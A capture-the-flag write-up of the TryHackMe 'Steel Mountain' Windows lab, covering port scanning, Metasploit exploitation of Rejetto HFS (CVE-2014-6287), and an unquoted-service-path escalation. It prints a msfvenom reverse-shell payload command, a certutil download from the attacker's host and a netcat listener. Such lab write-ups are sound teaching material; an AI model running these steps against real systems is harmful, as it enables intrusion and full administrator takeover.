---
layout: post
title: "Steel Mountain"
date: 2022-10-21
categories: [Tryhackme, Easy-THM]
tags: [rejetto, RCE, metasploit, WinPEAS, msfvenom, Unquoted-Service-Path]
image: ../../assets/img/posts/steelmountain.png 

---

## Description

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation, enumeration and learn a new technique to get Administrator access.

|**Room**|[Steel Mountain](https://tryhackme.com/room/steelmountain)|
|:---:|:---:|
|**OS**|Windows|
|**Difficulty**|Easy|
|**Creator**|[tryhackme](https://tryhackme.com/p/tryhackme)|

---

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.240.220 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/186901992-d627cb10-80b0-462f-8463-9bc29f4b4939.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
nmap -sC -sV -p80,135,139,445,5985,8080,47001,49152,49153,49154,49155,49157,49163,49164 10.10.240.220 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/186902052-de014c21-e883-4f5c-adfe-488910db09f2.png)
![image](https://user-images.githubusercontent.com/67465230/186902100-f71e610b-ba79-4cc2-831d-490e581e58d1.png)

Result scan shows that port 80 is running webserver, port 139,445 is running SMB service, port 5985 is running MS HTTPAPI service, port 8080 is running HttpFileServer service. 

Let's visit http://10.10.124.2,

![image](https://user-images.githubusercontent.com/67465230/186902197-ffd800b8-0062-4b7e-ab5a-609d1c6ab245.png)

We landed on the page where we can see the picture of employee of the month. But after enumerating this website like looking at it's source page, fuzzing it's hidden directories, checking what technologies are there on this website, but I couldn't find anything interesting. 

So I decided to visit to enumerate port 8080 by visiting http://10.10.124.2:8080,

![image](https://user-images.githubusercontent.com/67465230/186902273-5a9a5115-2612-4605-905f-66f81002af1e.png)

We landed on a page where HttpFileServer 2.3 is running and there is no file uploaded already on this website. 

So I decided to search for the service exploit on the ExploitDB for HttpFileServer 2.3, [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161)

![image](https://user-images.githubusercontent.com/67465230/186902327-99facbb9-add3-4c75-b3be-0b957866dafe.png)

> CVE-2014-6287 : Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using '%00' to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.

There is also metasploit module for this exploit so I decided to first boot up the metasploit using `msfconsole -q` (neglecting the banner), and the search for the exploit,

```bash
search rejetto
```

![image](https://user-images.githubusercontent.com/67465230/186902360-c261f080-3ec6-4c94-9728-84146077fdef.png)

There is a module. We can use this module to exploit the machine which is vulnerable to this service. 

Let's use this exploit using,

```bash 
use exploit/windows/http/rejetto_hfs_hxec
```

![image](https://user-images.githubusercontent.com/67465230/186902401-79c19242-0a7b-4283-a335-7c70c1de83b2.png)

Let's set the `options`:
- **set rhosts 10.10.240.220**
- **set lhost tun0**
- **set rhosts 8080**

Running the exploit using `run` and we got a shell,

![image](https://user-images.githubusercontent.com/67465230/186902445-a849c7fb-ee4c-4d72-9907-c80acfa8ef99.png)

we got a meterpreter shell. Issuing `getuid` command and we got to know that we are STEELMOUNTAIN\bill user. 

Okay, so now we got a meterpreter shell so we can drop into shell (which is **cmd**, *default for windows*) using `shell` command. Navigating to bill user desktop, we got the user flag,

![image](https://user-images.githubusercontent.com/67465230/186902482-cae81dab-acdf-44d3-9eef-41ee9514a1db.png)

Now, that we are done with getting foothold process on machine, we now have to perform Privilege Escalation and to achieve this, we have to enumerate the system first. So Let's upload the winpeas executable on the target machine using,

```bash
upload /home/kali/vm_walkthrough/tryhackme/easy/steel_mountain/winpeas.exe
```

![image](https://user-images.githubusercontent.com/67465230/186902520-04e00b92-79e7-45bc-b78d-97513f5fb3bb.png)

winpeas.exe got uploaded on the machine. 

Let's run this executable using `winpeas.exe` and after scrolling down the result, we can see that there are **Unquoted Service Paths** and bill user has permissions to write data/ create files on the directory making it's easy for bill user to escalate privileges to Administrator user,

![image](https://user-images.githubusercontent.com/67465230/186902567-9b2bea4c-4be4-422b-835f-72405af8e4d5.png)

>What is Unquoted Service Path?
>>When a **service** is created whose **executable path** contains _spaces_ and isn’t enclosed within _quotes_, leads to a vulnerability known as Unquoted Service Path which allows a user to gain **SYSTEM** privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
>>In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

Let's try another command to confirm that there is Unquoted Service Path,

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "C:\windows\\" |findstr /i /v """
```

![image](https://user-images.githubusercontent.com/67465230/186902601-c425e699-2fd6-4a06-97be-b95424d8ce37.png)

We  can see that there is indeed an Unquoted Service Path and we can abuse this vulnerability to escalate our privilege to Administrator user by creating the file with same name as directory just before the service executable, **Advanced.exe** and windows will execute it first before even executing the original ASCService.exe and since our malicious file gets executed first, we will get a reverse shell.

Let's create a malicious payload using msfvenom,

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.171 LPORT=5555 -f exe -o Advanced.exe
```

![image](https://user-images.githubusercontent.com/67465230/186902690-415368a2-9ef6-453d-a63a-7e1e5e1de5d1.png)

Our payload is generated and now is the time to transfer this payload into **C:\Program Files (x86)\IObit** directory. To transfer executable on target machine, first start the python server using `python3 -m http.server` and now we can use `certutil` command to transfer the payload,

```bash
certutil -urlcache -f http://10.9.3.171:8080/Advanced.exe Advanced.exe 
```

![image](https://user-images.githubusercontent.com/67465230/186902731-6f2610d9-8cfa-48dd-ae63-23cde210e8c3.png)

Our malicious payload gets transferred successfully on the target machine. 

Now, let's first start the netcat listener using `nc -nvlp 5555` and then let's stop the service using,

```bash
sc stop AdvancedSystemCareService9
```

![image](https://user-images.githubusercontent.com/67465230/186902771-0bc56016-86da-466b-8c98-3af99cc74ce4.png)

The service is stopped. 

Starting the service again,

```bash
sc start AdvancedSystemCareService9
```

![image](https://user-images.githubusercontent.com/67465230/186902809-5ba7ec77-daa8-495c-8921-11dc7d73fd70.png)

After starting the service again, we will get the reverse shell and issuing the `whoami` command, we get to know that we are system user,

![image](https://user-images.githubusercontent.com/67465230/186902861-9c36e18f-3345-4182-a6c3-207bfa4f109c.png)
